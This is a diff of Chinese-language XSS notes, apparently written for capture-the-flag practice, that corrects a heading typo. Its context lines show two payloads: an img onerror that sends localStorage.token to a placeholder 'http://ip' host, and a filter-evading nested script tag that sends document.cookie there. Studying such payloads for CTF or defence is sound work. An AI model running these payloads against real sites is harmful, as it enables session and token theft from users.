@@ -147,7 +147,7 @@ Connection: close
 
 但是ajax不能携带cookie
 
-## 2.tooken
+## 2.token
 
 `<img src=x onerror='fetch("http://ip/get_flag.php?c="+encodeURIComponent(localStorage.token))'>`
 
@@ -177,4 +177,5 @@ Connection: close
 
 比如后端把payload中的script删除，这时候可以这样构造
 `<scrscriptipt>location.href="http://ip/get_flag.php?c="+document.cookie</scrscriptipt>`
+
 
